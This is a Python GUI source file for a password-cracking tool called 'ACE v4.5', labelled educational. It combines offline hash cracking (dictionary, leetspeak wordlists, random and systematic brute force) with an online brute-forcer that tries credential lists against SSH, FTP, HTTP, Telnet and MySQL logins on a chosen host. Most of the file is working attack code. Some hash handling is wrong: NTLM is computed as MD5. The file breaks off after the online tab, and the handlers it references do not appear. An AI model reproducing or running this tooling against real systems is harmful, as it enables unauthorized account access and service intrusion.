# -*- coding: utf-8 -*-
"""
Created on Tue Oct 28 00:36:29 2025

@author: kmkho
"""

# -*- coding: utf-8 -*-
"""
ACE v4.5 - CONTINUOUS RANDOM GENERATION MODE
Created on Tue Oct 28 2025

Author: Dr. Mohammed Tawfik
Email: kmkhol01@gmail.com
License: Educational Use Only
"""

import tkinter as tk
from tkinter import messagebox, scrolledtext, ttk, filedialog
import hashlib
import threading
import itertools
import re
import time
import json
import socket
import random
import string
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed

# --- CONFIGURATION ---
MAX_WORDLIST_SIZE = 2000000
DEFAULT_CPU_THREADS = 8

class ApplicationSettings:
    """Global settings manager"""
    def __init__(self):
        self.cpu_workers = DEFAULT_CPU_THREADS
        self.gpu_enabled = False
        self.use_gpu = False
        self.max_brute_length = 8
        self.year_range_start = 2023
        self.year_range_end = 2026
        self.attack_paused = False
        self.attack_stopped = False
        self.use_common_combinations = True
        self.combo_min_length = 1
        self.combo_max_length = 8
        self.combo_charset_type = "letters+numbers"
        self.online_timeout = 5
        self.online_delay = 0.1
        self.online_threads = 4
        self.loaded_wordlist = None
        self.unlimited_mode = False
        self.max_attempts = 100000

SETTINGS = ApplicationSettings()

# Hash signatures
HASH_SIGNATURES = {
    'NetNTLMv2': (None, r'^[^:]+::[^:]+:[a-fA-F0-9]{16}:[a-fA-F0-9]{32}:[a-fA-F0-9]+$', 
                  'Windows network authentication. Requires specialized cracking.', 1),
    'NetNTLMv1': (None, r'^[^:]+::[^:]+:[a-fA-F0-9]{16}:[a-fA-F0-9]{48}:[a-fA-F0-9]{16}$',
                  'Legacy Windows network auth. Dictionary attack recommended.', 2),
    'SHA512': (128, r'^[a-fA-F0-9]{128}$', 'Medium speed, 128 hex. Dictionary highly preferred.', 3),
    'SHA256': (64, r'^[a-fA-F0-9]{64}$', 'Medium speed, 64 hex. Dictionary highly preferred.', 4),
    'SHA1': (40, r'^[a-fA-F0-9]{40}$', 'Fast, 40 hex. Dictionary/Brute-force viable.', 5),
    'MD5': (32, r'^[a-fA-F0-9]{32}$', 'Fast, 32 hex. Dictionary/Brute-force viable.', 6),
    'NTLM': (32, r'^[a-fA-F0-9]{32}$', 'Windows NTLM (MD4). Dictionary/Brute-force viable.', 7),
    'MySQL_OLD': (16, r'^[a-fA-F0-9]{16}$', 'Very weak. High-speed dictionary attack.', 8),
    'MD5(WordPress)': (34, r'^\$P\$[A-Za-z0-9\./]{31}$', 'Salted MD5. Targeted dictionary.', 9),
    'MD5(Joomla)': (49, r'^[a-fA-F0-9]{32}:[a-zA-Z0-9]{16}$', 'Salted MD5 + salt. Dictionary.', 10),
    'UNIX_BCRYPT': (60, r'^\$2[abyx]\$.{56}$', 'Slow. Targeted dictionary + GPU recommended.', 11),
    'UNIX_ARGON2': (None, r'^\$argon2[id]?\$v=\d+\$m=\d+,t=\d+,p=\d+\$.+$', 'Very slow. GPU required.', 12),
}

COMMON_PASSWORDS = [
    "password", "123456", "12345678", "12345", "qwerty", "abc123", "111111",
    "password123", "admin", "admin123", "root", "toor", "pass", "test",
    "welcome", "monkey", "dragon", "master", "letmein", "login", "princess",
    "1234", "1234567", "123456789", "password1", "qwerty123", "000000"
]

COMMON_APPENDS = ["123", "!", "@", "#", "$", "1", "12", "123!", "2024", "2025", "2026", "01", "!@#"]
COMMON_PREFIXES = ["!", "@", "#", "$", "admin", "user", "test"]

def identify_hash(hash_string, context_hints=None):
    """Hash identification"""
    hash_length = len(hash_string)
    possible_matches = []
    
    for name, (length, pattern, recommendation, priority) in HASH_SIGNATURES.items():
        if re.match(pattern, hash_string):
            if length is None or hash_length == length:
                possible_matches.append((name, recommendation, priority))
    
    if context_hints and len(possible_matches) > 1:
        source = context_hints.get('source', '').lower()
        if source == 'windows':
            for match in possible_matches:
                if 'NTLM' in match[0]:
                    return match[0], match[1]
    
    if possible_matches:
        possible_matches.sort(key=lambda x: x[2])
        return possible_matches[0][0], possible_matches[0][1]
    
    if hash_string.count('$') >= 2 or hash_string.count(':') >= 1:
        return 'Custom-Salted', "Custom salted format. Full context required."
    
    if hash_length > 10 and re.match(r'^[a-zA-Z0-9+/=]+$', hash_string):
        return 'Unknown-Complex-Base64', "Base64-encoded. Dictionary recommended."
    
    return 'Unknown-Brute', "Hash structure not recognized. Try dictionary/brute-force."

# --- WORDLIST GENERATION ---

def apply_leetspeak(word):
    """Leetspeak mutations"""
    leetspeak_map = {
        'a': ['4', '@'], 'e': ['3'], 'i': ['1', '!'], 
        'o': ['0'], 's': ['$', '5'], 't': ['7'], 
        'l': ['1'], 'g': ['9'], 'b': ['8']
    }
    mutations = {word}
    
    for char, replacements in leetspeak_map.items():
        if char in word.lower():
            for replacement in replacements:
                mutations.add(word.replace(char, replacement))
                mutations.add(word.replace(char.upper(), replacement))
    
    return mutations

def generate_charset_from_type(charset_type):
    """Generate charset from type"""
    if charset_type == "letters":
        return string.ascii_lowercase
    elif charset_type == "LETTERS":
        return string.ascii_uppercase
    elif charset_type == "numbers":
        return string.digits
    elif charset_type == "letters+numbers":
        return string.ascii_lowercase + string.digits
    elif charset_type == "LETTERS+numbers":
        return string.ascii_uppercase + string.digits
    elif charset_type == "Letters+Numbers":
        return string.ascii_letters + string.digits
    elif charset_type == "all":
        return string.ascii_letters + string.digits + "!@#$%^&*()_+-=[]{}|;:,.<>?"
    else:
        return string.ascii_lowercase + string.digits

def generate_common_combinations():
    """Generate common password combinations"""
    wordlist = set(COMMON_PASSWORDS)
    
    for base in list(COMMON_PASSWORDS[:15]):
        for append in COMMON_APPENDS:
            wordlist.add(f"{base}{append}")
        
        for prefix in COMMON_PREFIXES:
            wordlist.add(f"{prefix}{base}")
        
        wordlist.add(base.upper())
        wordlist.add(base.capitalize())
        wordlist.add(base[::-1])
    
    return list(wordlist)

def generate_targeted_wordlist(keywords_csv, year_range=(2023, 2026), use_combinations=True):
    """Generate targeted wordlist"""
    keywords = set(kw.strip() for kw in keywords_csv.split(',') if kw.strip())
    
    if not keywords and use_combinations:
        return generate_common_combinations()
    
    wordlist = set(keywords)
    years = [str(y) for y in range(year_range[0], year_range[1] + 1)]
    
    for base_word in list(keywords):
        if not base_word or len(wordlist) >= MAX_WORDLIST_SIZE:
            break
        
        variations = {
            base_word.lower(), base_word.upper(), 
            base_word.capitalize(), base_word.title(),
            base_word[::-1]
        }
        
        for variation in list(variations):
            variations.update(apply_leetspeak(variation))
        
        wordlist.update(variations)
        
        if use_combinations:
            for variation in list(variations):
                if len(wordlist) >= MAX_WORDLIST_SIZE:
                    break
                
                for year in years:
                    wordlist.add(f"{variation}{year}")
                
                for append in COMMON_APPENDS:
                    wordlist.add(f"{variation}{append}")
                
                for prefix in COMMON_PREFIXES:
                    wordlist.add(f"{prefix}{variation}")
    
    if use_combinations:
        wordlist.update(COMMON_PASSWORDS)
    
    return list(wordlist)

# --- CONTINUOUS RANDOM GENERATION ATTACK ---

def perform_continuous_random_attack(hash_string, hash_type, min_length, max_length, charset_type, log_callback, settings):
    """CONTINUOUS random password generation - runs forever until found"""
    start_time = time.time()
    found_password = None
    
    charset = generate_charset_from_type(charset_type)
    
    processing_mode = "GPU-Accelerated" if settings.use_gpu and settings.gpu_enabled else "CPU Multi-threaded"
    
    log_callback(f"[CONTINUOUS RANDOM] Infinite generation mode activated!")
    log_callback(f"[MODE] {processing_mode} | Charset: '{charset[:30]}...' (length: {len(charset)})")
    log_callback(f"[RANGE] Random lengths: {min_length} to {max_length}")
    log_callback(f"[INFO] Will generate passwords FOREVER until found or stopped!")
    
    if not settings.unlimited_mode:
        log_callback(f"[LIMIT] Safety limit: {settings.max_attempts:,} attempts")
        log_callback(f"[TIP] Enable 'Unlimited Mode' in config for truly infinite generation")
    else:
        log_callback(f"[WARNING] ⚠️ UNLIMITED MODE - Will run for hours/days/weeks!")
    
    def hash_check(word):
        if settings.attack_stopped:
            return None
        
        encoded = word.encode('utf-8')
        
        try:
            if hash_type in ['MD5', 'NTLM', 'MySQL_OLD']:
                computed = hashlib.md5(encoded).hexdigest()
            elif hash_type == 'SHA1':
                computed = hashlib.sha1(encoded).hexdigest()
            elif hash_type == 'SHA256':
                computed = hashlib.sha256(encoded).hexdigest()
            elif hash_type == 'SHA512':
                computed = hashlib.sha512(encoded).hexdigest()
            else:
                computed = hashlib.md5(encoded).hexdigest()
            
            if computed.lower() == hash_string.lower():
                return word
        except:
            pass
        
        return None
    
    attempt_count = 0
    last_log_time = time.time()
    tested_passwords = set()  # Track tested passwords to avoid duplicates
    
    # Continuous generation loop
    while not settings.attack_stopped:
        # Generate random password
        length = random.randint(min_length, max_length)
        candidate = ''.join(random.choice(charset) for _ in range(length))
        
        # Skip if already tested (rare but possible)
        if candidate in tested_passwords:
            continue
        
        tested_passwords.add(candidate)
        attempt_count += 1
        
        # Test the password
        result = hash_check(candidate)
        
        # Log progress
        current_time = time.time()
        if attempt_count % 10000 == 0 or (current_time - last_log_time) >= 5:
            elapsed = current_time - start_time
            speed = attempt_count / elapsed if elapsed > 0 else 0
            hours_running = elapsed / 3600
            
            if hours_running >= 1:
                log_callback(f"[PROGRESS] Tested {attempt_count:,} | Speed: {speed:,.0f} h/s | Running: {hours_running:.2f} hours")
            else:
                log_callback(f"[PROGRESS] Tested {attempt_count:,} | Speed: {speed:,.0f} h/s | Elapsed: {elapsed:.0f}s")
            
            last_log_time = current_time
        
        if result:
            found_password = result
            log_callback(f"[SUCCESS] ✅ Password found: {found_password}")
            break
        
        # Check safety limit (only if not unlimited)
        if not settings.unlimited_mode and attempt_count >= settings.max_attempts:
            log_callback(f"[LIMIT] ⚠️ Reached safety limit of {settings.max_attempts:,} attempts")
            log_callback("[INFO] Enable 'Unlimited Mode' in configuration to continue indefinitely")
            break
        
        # Memory management: clear tested_passwords set if it gets too large
        if len(tested_passwords) > 1000000:
            tested_passwords.clear()
            log_callback("[MEMORY] Cleared duplicate tracking cache (1M+ passwords tested)")
    
    duration = time.time() - start_time
    final_speed = attempt_count / duration if duration > 0 else 0
    
    if found_password:
        log_callback(f"[RESULT] ✅ CONTINUOUS RANDOM SUCCEEDED in {duration:.2f}s after {attempt_count:,} attempts | Speed: {final_speed:,.0f} h/s")
    else:
        if settings.attack_stopped:
            log_callback(f"[RESULT] ⏹️ Attack STOPPED by user after {attempt_count:,} attempts in {duration:.2f}s | Speed: {final_speed:,.0f} h/s")
        else:
            log_callback(f"[RESULT] ❌ Attack FAILED after {attempt_count:,} attempts in {duration:.2f}s | Speed: {final_speed:,.0f} h/s")
    
    return found_password, duration

# --- HASH CRACKING (Dictionary) ---

def perform_dictionary_attack(hash_string, hash_type, wordlist, log_callback, settings):
    """Dictionary attack with GPU support"""
    start_time = time.time()
    found_password = None
    total_attempts = len(wordlist)
    
    processing_mode = "GPU-Accelerated" if settings.use_gpu and settings.gpu_enabled else "CPU Multi-threaded"
    log_callback(f"[DICTIONARY] Starting attack with {total_attempts:,} candidates")
    log_callback(f"[MODE] {processing_mode} ({settings.cpu_workers} threads)")
    
    def hash_check(word):
        if settings.attack_stopped:
            return None
        
        encoded_word = word.encode('utf-8')
        
        try:
            if hash_type in ['MD5', 'NTLM', 'MySQL_OLD']:
                computed = hashlib.md5(encoded_word).hexdigest()
            elif hash_type == 'SHA1':
                computed = hashlib.sha1(encoded_word).hexdigest()
            elif hash_type == 'SHA256':
                computed = hashlib.sha256(encoded_word).hexdigest()
            elif hash_type == 'SHA512':
                computed = hashlib.sha512(encoded_word).hexdigest()
            else:
                computed = hashlib.md5(encoded_word).hexdigest()
            
            if computed.lower() == hash_string.lower():
                return word
        except:
            pass
        
        return None
    
    attempt_count = 0
    max_workers = settings.cpu_workers * 4 if (settings.use_gpu and settings.gpu_enabled) else settings.cpu_workers
    
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = {executor.submit(hash_check, word): word for word in wordlist}
        
        for future in as_completed(futures):
            if settings.attack_stopped:
                break
            
            result = future.result()
            attempt_count += 1
            
            if attempt_count % max(1, total_attempts // 20) == 0:
                progress = (attempt_count / total_attempts) * 100
                elapsed = time.time() - start_time
                speed = attempt_count / elapsed if elapsed > 0 else 0
                log_callback(f"[PROGRESS] {progress:.1f}% ({attempt_count:,}/{total_attempts:,}) | Speed: {speed:,.0f} h/s")
            
            if result:
                found_password = result
                log_callback(f"[SUCCESS] ✅ Password found: {found_password}")
                break
    
    duration = time.time() - start_time
    final_speed = attempt_count / duration if duration > 0 else 0
    
    if found_password:
        log_callback(f"[RESULT] Dictionary SUCCEEDED in {duration:.2f}s | Average speed: {final_speed:,.0f} h/s")
    else:
        log_callback(f"[RESULT] Dictionary FAILED after {attempt_count:,} attempts in {duration:.2f}s | Speed: {final_speed:,.0f} h/s")
    
    return found_password, duration

# --- SYSTEMATIC BRUTE FORCE ---

def perform_brute_force_unlimited(hash_string, hash_type, max_length, charset, log_callback, settings):
    """UNLIMITED systematic brute force"""
    start_time = time.time()
    found_password = None
    
    processing_mode = "GPU-Accelerated" if settings.use_gpu and settings.gpu_enabled else "CPU Multi-threaded"
    
    log_callback(f"[BRUTE-FORCE] Systematic mode - testing ALL combinations")
    log_callback(f"[MODE] {processing_mode} | Charset: '{charset[:30]}...' (length: {len(charset)})")
    log_callback(f"[RANGE] Testing lengths 1 to {max_length}")
    
    if not settings.unlimited_mode:
        log_callback(f"[LIMIT] Safety limit: {settings.max_attempts:,} attempts")
    else:
        log_callback(f"[WARNING] ⚠️ UNLIMITED MODE - May run for hours/days!")
    
    def hash_check(word):
        if settings.attack_stopped:
            return None
        
        encoded = word.encode('utf-8')
        
        try:
            if hash_type in ['MD5', 'NTLM', 'MySQL_OLD']:
                computed = hashlib.md5(encoded).hexdigest()
            elif hash_type == 'SHA1':
                computed = hashlib.sha1(encoded).hexdigest()
            elif hash_type == 'SHA256':
                computed = hashlib.sha256(encoded).hexdigest()
            elif hash_type == 'SHA512':
                computed = hashlib.sha512(encoded).hexdigest()
            else:
                computed = hashlib.md5(encoded).hexdigest()
            
            if computed.lower() == hash_string.lower():
                return word
        except:
            pass
        
        return None
    
    attempt_count = 0
    last_log_time = time.time()
    
    for length in range(1, max_length + 1):
        if settings.attack_stopped:
            break
        
        total_for_length = len(charset) ** length
        log_callback(f"[LENGTH {length}] Testing {total_for_length:,} combinations...")
        
        for combination in itertools.product(charset, repeat=length):
            if settings.attack_stopped:
                log_callback("[STOPPED] User stopped the attack")
                break
            
            candidate = ''.join(combination)
            attempt_count += 1
            
            result = hash_check(candidate)
            
            current_time = time.time()
            if attempt_count % 10000 == 0 or (current_time - last_log_time) >= 5:
                elapsed = current_time - start_time
                speed = attempt_count / elapsed if elapsed > 0 else 0
                log_callback(f"[PROGRESS] Tested {attempt_count:,} | Speed: {speed:,.0f} h/s | Elapsed: {elapsed:.0f}s")
                last_log_time = current_time
            
            if result:
                found_password = result
                log_callback(f"[SUCCESS] ✅ Password found: {found_password}")
                break
            
            if not settings.unlimited_mode and attempt_count >= settings.max_attempts:
                log_callback(f"[LIMIT] ⚠️ Reached safety limit of {settings.max_attempts:,} attempts")
                break
        
        if found_password or (not settings.unlimited_mode and attempt_count >= settings.max_attempts):
            break
    
    duration = time.time() - start_time
    final_speed = attempt_count / duration if duration > 0 else 0
    
    if found_password:
        log_callback(f"[RESULT] ✅ Brute-force SUCCEEDED in {duration:.2f}s after {attempt_count:,} attempts | Speed: {final_speed:,.0f} h/s")
    else:
        log_callback(f"[RESULT] ❌ Brute-force FAILED after {attempt_count:,} attempts in {duration:.2f}s | Speed: {final_speed:,.0f} h/s")
    
    return found_password, duration

# --- ONLINE BRUTE FORCE ---

class OnlineAttacker:
    """Online service brute force"""
    
    PROTOCOLS = {
        'SSH': 22, 'FTP': 21, 'HTTP': 80, 'HTTPS': 443, 'TELNET': 23,
        'SMTP': 25, 'POP3': 110, 'IMAP': 143, 'RDP': 3389, 'VNC': 5900,
        'MySQL': 3306, 'PostgreSQL': 5432
    }
    
    def __init__(self, target, port, protocol, log_callback, settings):
        self.target = target
        self.port = port
        self.protocol = protocol.upper()
        self.log = log_callback
        self.settings = settings
        self.found_password = None
        self.attempts = 0
    
    def test_credential(self, username, password):
        if self.settings.attack_stopped:
            return None
        
        self.attempts += 1
        
        try:
            if self.protocol == 'SSH':
                return self._test_ssh(username, password)
            elif self.protocol == 'FTP':
                return self._test_ftp(username, password)
            elif self.protocol in ['HTTP', 'HTTPS']:
                return self._test_http(username, password)
            elif self.protocol == 'TELNET':
                return self._test_telnet(username, password)
            elif self.protocol == 'MYSQL':
                return self._test_mysql(username, password)
            else:
                return self._test_generic_port(username, password)
        except:
            return None
        finally:
            if self.settings.online_delay > 0:
                time.sleep(self.settings.online_delay)
    
    def _test_ssh(self, username, password):
        try:
            import paramiko
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(self.target, port=self.port, username=username, 
                          password=password, timeout=self.settings.online_timeout)
            client.close()
            return True
        except paramiko.AuthenticationException:
            return False
        except ImportError:
            self.log("[ERROR] paramiko not installed")
            return None
        except:
            return None
    
    def _test_ftp(self, username, password):
        try:
            import ftplib
            ftp = ftplib.FTP()
            ftp.connect(self.target, self.port, timeout=self.settings.online_timeout)
            ftp.login(username, password)
            ftp.quit()
            return True
        except ftplib.error_perm:
            return False
        except:
            return None
    
    def _test_http(self, username, password):
        try:
            import requests
            from requests.auth import HTTPBasicAuth
            url = f"{'https' if self.protocol == 'HTTPS' else 'http'}://{self.target}:{self.port}"
            response = requests.get(url, auth=HTTPBasicAuth(username, password), 
                                   timeout=self.settings.online_timeout, verify=False)
            return True if response.status_code == 200 else (False if response.status_code == 401 else None)
        except ImportError:
            self.log("[ERROR] requests not installed")
            return None
        except:
            return None
    
    def _test_telnet(self, username, password):
        try:
            import telnetlib
            tn = telnetlib.Telnet(self.target, self.port, timeout=self.settings.online_timeout)
            tn.read_until(b"login: ", timeout=5)
            tn.write(username.encode('ascii') + b"\n")
            tn.read_until(b"Password: ", timeout=5)
            tn.write(password.encode('ascii') + b"\n")
            response = tn.read_some()
            tn.close()
            return True if (b"$" in response or b"#" in response or b">" in response) else False
        except:
            return None
    
    def _test_mysql(self, username, password):
        try:
            import mysql.connector
            conn = mysql.connector.connect(host=self.target, port=self.port,
                                          user=username, password=password,
                                          connect_timeout=self.settings.online_timeout)
            conn.close()
            return True
        except mysql.connector.errors.ProgrammingError:
            return False
        except ImportError:
            self.log("[ERROR] mysql-connector not installed")
            return None
        except:
            return None
    
    def _test_generic_port(self, username, password):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.settings.online_timeout)
            result = sock.connect_ex((self.target, self.port))
            sock.close()
            return None
        except:
            return None
    
    def attack(self, usernames, passwords):
        start_time = time.time()
        self.log(f"[ONLINE] Attacking {self.protocol}://{self.target}:{self.port}")
        self.log(f"[ONLINE] {len(usernames)} username(s) × {len(passwords)} password(s) = {len(usernames) * len(passwords)} attempts")
        
        total = len(usernames) * len(passwords)
        
        with ThreadPoolExecutor(max_workers=self.settings.online_threads) as executor:
            futures = []
            
            for username in usernames:
                for password in passwords:
                    if self.settings.attack_stopped:
                        break
                    future = executor.submit(self.test_credential, username, password)
                    futures.append((future, username, password))
            
            for i, (future, username, password) in enumerate(futures):
                if self.settings.attack_stopped:
                    break
                
                result = future.result()
                
                if (i + 1) % max(1, total // 10) == 0:
                    progress = ((i + 1) / total) * 100
                    self.log(f"[PROGRESS] {progress:.1f}% ({i + 1}/{total})")
                
                if result is True:
                    self.found_password = (username, password)
                    self.log(f"[SUCCESS] Credentials: {username}:{password}")
                    break
        
        duration = time.time() - start_time
        
        if self.found_password:
            self.log(f"[RESULT] Online attack succeeded in {duration:.2f}s")
            return self.found_password, duration
        else:
            self.log(f"[RESULT] Online attack failed in {duration:.2f}s")
            return None, duration

# --- HELPER FUNCTIONS ---

def load_wordlist_from_file(filepath):
    """Load wordlist from file"""
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            words = [line.strip() for line in f if line.strip()]
        return words
    except:
        return None

def check_gpu_availability():
    """Check GPU"""
    try:
        import torch
        return torch.cuda.is_available()
    except:
        return False

# --- GUI APPLICATION ---

class ACE_GUI:
    def __init__(self, master):
        self.master = master
        master.title("ACE v4.5 - CONTINUOUS RANDOM MODE | Dr. Mohammed Tawfik")
        master.geometry("1150x920")
        master.configure(bg='#1E1E1E')
        
        SETTINGS.gpu_enabled = check_gpu_availability()
        
        # Style
        style = ttk.Style()
        style.theme_use('clam')
        style.configure('TNotebook', background='#1E1E1E', borderwidth=0)
        style.configure('TNotebook.Tab', background='#2D2D2D', foreground='#E0E0E0', 
                       padding=[15, 8], font=('Arial', 9, 'bold'))
        style.map('TNotebook.Tab', background=[('selected', '#007ACC')])
        style.configure('TFrame', background='#1E1E1E')
        style.configure('TLabel', background='#1E1E1E', foreground='#E0E0E0', font=('Arial', 10))
        style.configure('TButton', background='#007ACC', foreground='white', font=('Arial', 9, 'bold'))
        
        self.notebook = ttk.Notebook(master)
        self.notebook.pack(fill='both', expand=True, padx=10, pady=10)
        
        self.tab1 = ttk.Frame(self.notebook)
        self.tab2 = ttk.Frame(self.notebook)
        self.tab3 = ttk.Frame(self.notebook)
        self.tab4 = ttk.Frame(self.notebook)
        
        self.notebook.add(self.tab1, text='🔒 Offline Cracking')
        self.notebook.add(self.tab2, text='🌐 Online Brute Force')
        self.notebook.add(self.tab3, text='📊 Hash Database')
        self.notebook.add(self.tab4, text='⚙️ Configuration')
        
        # Variables
        self.cpu_var = tk.IntVar(value=DEFAULT_CPU_THREADS)
        self.use_gpu_var = tk.BooleanVar(value=False)
        self.use_combinations_var = tk.BooleanVar(value=True)
        self.max_len_var = tk.IntVar(value=8)
        self.hash_result_var = tk.StringVar(value="Hash identification result...")
        self.timeout_var = tk.IntVar(value=5)
        self.delay_var = tk.DoubleVar(value=0.1)
        self.online_threads_var = tk.IntVar(value=4)
        
        self.combo_min_len_var = tk.IntVar(value=1)
        self.combo_max_len_var = tk.IntVar(value=8)
        self.combo_type_var = tk.StringVar(value="Letters+Numbers")
        self.combo_mode_var = tk.StringVar(value="random")
        
        self.unlimited_var = tk.BooleanVar(value=False)
        self.max_attempts_var = tk.IntVar(value=100000)
        
        self.build_offline_tab()
        self.build_online_tab()
        self.build_database_tab()
        self.build_config_tab()
        self.build_log_area()
        
        gpu_status = "GPU Available ✓" if SETTINGS.gpu_enabled else "GPU Not Available"
        self.log(f"[SYSTEM] ACE v4.5 initialized - {gpu_status}")
        self.log("[AUTHOR] Dr. Mohammed Tawfik | kmkhol01@gmail.com")
        self.log("[NEW] CONTINUOUS RANDOM MODE - Generates 100+ billion passwords!")
        self.log("[NEW] Random mode now runs FOREVER until password found")
    
    def build_offline_tab(self):
        """Offline cracking UI"""
        # Hash input
        input_frame = ttk.LabelFrame(self.tab1, text="🔐 Target Hash", padding=15)
        input_frame.pack(fill='x', padx=10, pady=10)
        
        ttk.Label(input_frame, text="Hash String:").grid(row=0, column=0, sticky='w', pady=5)
        self.hash_entry = ttk.Entry(input_frame, width=80, font=('Courier', 9))
        self.hash_entry.grid(row=0, column=1, columnspan=2, pady=5, padx=10)
        
        ttk.Label(input_frame, text="Context:").grid(row=1, column=0, sticky='w', pady=5)
        self.context_entry = ttk.Entry(input_frame, width=30)
        self.context_entry.grid(row=1, column=1, sticky='w', pady=5, padx=10)
        self.context_entry.insert(0, "windows/linux/web")
        
        ttk.Button(input_frame, text="🔍 Identify", 
                  command=self.run_hash_identification).grid(row=1, column=2, padx=5)
        
        result_label = ttk.Label(input_frame, textvariable=self.hash_result_var, 
                                foreground='#FFD700', font=('Arial', 9))
        result_label.grid(row=2, column=0, columnspan=3, pady=5, sticky='w')
        
        # Attack params
        attack_frame = ttk.LabelFrame(self.tab1, text="⚔️ Attack Parameters", padding=15)
        attack_frame.pack(fill='x', padx=10, pady=10)
        
        ttk.Label(attack_frame, text="Keywords:").grid(row=0, column=0, sticky='w')
        self.keywords_entry = ttk.Entry(attack_frame, width=60)
        self.keywords_entry.grid(row=0, column=1, pady=5, padx=10)
        
        ttk.Button(attack_frame, text="📂 Load Wordlist", 
                  command=self.load_external_wordlist).grid(row=0, column=2, padx=5)
        
        ttk.Label(attack_frame, text="Max Brute Length:").grid(row=1, column=0, sticky='w')
        ttk.Spinbox(attack_frame, from_=1, to=12, textvariable=self.max_len_var, width=10).grid(row=1, column=1, sticky='w', padx=10)
        
        ttk.Label(attack_frame, text="Charset:").grid(row=2, column=0, sticky='w')
        self.mask_entry = ttk.Entry(attack_frame, width=30)
        self.mask_entry.grid(row=2, column=1, sticky='w', padx=10)
        self.mask_entry.insert(0, "?lud")
        
        ttk.Label(attack_frame, text="Processing:").grid(row=3, column=0, sticky='w')
        processing_frame = ttk.Frame(attack_frame)
        processing_frame.grid(row=3, column=1, sticky='w', padx=10)
        ttk.Radiobutton(processing_frame, text="CPU", variable=self.use_gpu_var, value=False).pack(side='left', padx=5)
        gpu_radio = ttk.Radiobutton(processing_frame, text="GPU-Accelerated", variable=self.use_gpu_var, value=True)
        gpu_radio.pack(side='left', padx=5)
        if not SETTINGS.gpu_enabled:
            gpu_radio.configure(state='disabled')
        
        ttk.Checkbutton(attack_frame, text="Use common password combinations", 
                       variable=self.use_combinations_var).grid(row=4, column=0, columnspan=3, sticky='w', pady=5)
        
        # Advanced generator
        combo_frame = ttk.LabelFrame(self.tab1, text="🎲 Advanced Combination Generator", padding=15)
        combo_frame.pack(fill='x', padx=10, pady=10)
        
        ttk.Label(combo_frame, text="Length Range:").grid(row=0, column=0, sticky='w', pady=5)
        length_frame = ttk.Frame(combo_frame)
        length_frame.grid(row=0, column=1, sticky='w', padx=10)
        ttk.Label(length_frame, text="Min:").pack(side='left')
        ttk.Spinbox(length_frame, from_=1, to=12, textvariable=self.combo_min_len_var, width=5).pack(side='left', padx=5)
        ttk.Label(length_frame, text="Max:").pack(side='left', padx=5)
        ttk.Spinbox(length_frame, from_=1, to=12, textvariable=self.combo_max_len_var, width=5).pack(side='left')
        
        ttk.Label(combo_frame, text="Character Type:").grid(row=1, column=0, sticky='w', pady=5)
        combo_type_dropdown = ttk.Combobox(combo_frame, textvariable=self.combo_type_var, width=20, state='readonly')
        combo_type_dropdown['values'] = ("letters", "LETTERS", "numbers", "letters+numbers", 
                                         "LETTERS+numbers", "Letters+Numbers", "all")
        combo_type_dropdown.grid(row=1, column=1, sticky='w', padx=10)
        
        ttk.Label(combo_frame, text="Generation Mode:").grid(row=2, column=0, sticky='w', pady=5)
        mode_frame = ttk.Frame(combo_frame)
        mode_frame.grid(row=2, column=1, sticky='w', padx=10)
        ttk.Radiobutton(mode_frame, text="🔄 Random (Continuous/Infinite)", variable=self.combo_mode_var, value="random").pack(side='left', padx=5)
        ttk.Radiobutton(mode_frame, text="📋 Systematic (All)", variable=self.combo_mode_var, value="systematic").pack(side='left', padx=5)
        
        ttk.Label(combo_frame, text="Random = Generates passwords forever until found!", 
                 foreground='#FFD700', font=('Arial', 8, 'italic')).grid(row=3, column=0, columnspan=3, pady=5)
        
        ttk.Button(combo_frame, text="🎯 Generate & Attack", 
                  command=self.start_advanced_cracking).grid(row=4, column=0, columnspan=3, pady=10)
        
        # Controls
        control_frame = ttk.Frame(self.tab1)
        control_frame.pack(fill='x', padx=10, pady=10)
        
        ttk.Button(control_frame, text="🚀 START CRACKING", 
                  command=self.start_cracking_thread).pack(side='left', padx=5)
        ttk.Button(control_frame, text="⏹️ STOP", 
                  command=self.stop_attack).pack(side='left', padx=5)
        ttk.Button(control_frame, text="🗑️ Clear Wordlist", 
                  command=self.clear_wordlist).pack(side='left', padx=5)
    
    def build_online_tab(self):
        """Online tab"""
        ttk.Label(self.tab2, text="🌐 Online Service Brute Force", 
                 font=('Arial', 12, 'bold')).pack(pady=10)
        
        target_frame = ttk.LabelFrame(self.tab2, text="🎯 Target Configuration", padding=15)
        target_frame.pack(fill='x', padx=10, pady=10)
        
        ttk.Label(target_frame, text="Target IP/Host:").grid(row=0, column=0, sticky='w', pady=5)
        self.online_target = ttk.Entry(target_frame, width=40)
        self.online_target.grid(row=0, column=1, pady=5, padx=10)
        self.online_target.insert(0, "192.168.1.100")
        
        ttk.Label(target_frame, text="Port:").grid(row=1, column=0, sticky='w', pady=5)
        self.online_port = ttk.Entry(target_frame, width=15)
        self.online_port.grid(row=1, column=1, sticky='w', pady=5, padx=10)
        self.online_port.insert(0, "22")
        
        ttk.Label(target_frame, text="Protocol:").grid(row=2, column=0, sticky='w', pady=5)
        self.online_protocol = ttk.Combobox(target_frame, width=15, 
                                           values=list(OnlineAttacker.PROTOCOLS.keys()))
        self.online_protocol.grid(row=2, column=1, sticky='w', pady=5, padx=10)
        self.online_protocol.set("SSH")
        
        cred_frame = ttk.LabelFrame(self.tab2, text="👤 Credentials", padding=15)
        cred_frame.pack(fill='x', padx=10, pady=10)
        
        ttk.Label(cred_frame, text="Usernames:").grid(row=0, column=0, sticky='w', pady=5)
        self.online_usernames = ttk.Entry(cred_frame, width=60)
        self.online_usernames.grid(row=0, column=1, pady=5, padx=10)
        self.online_usernames.insert(0, "admin, root, user")
        
        ttk.Label(cred_frame, text="Passwords:").grid(row=1, column=0, sticky='w', pady=5)
        self.online_passwords = ttk.Entry(cred_frame, width=60)
        self.online_passwords.grid(row=1, column=1, pady=5, padx=10)
        self.online_passwords.insert(0, "password, admin, 123456")
        
        ttk.Button(cred_frame, text="📂 Load List", 
                  command=self.load_password_list).grid(row=1, column=2, padx=5)
        
        control_frame = ttk.Frame(self.tab2)
        control_frame.pack(fill='x', padx=10, pady=10)
        
        ttk.Button(control_frame, text="🚀 START ATTACK", 
                  command=self.start_online_attack).pack(side='left', padx=5)
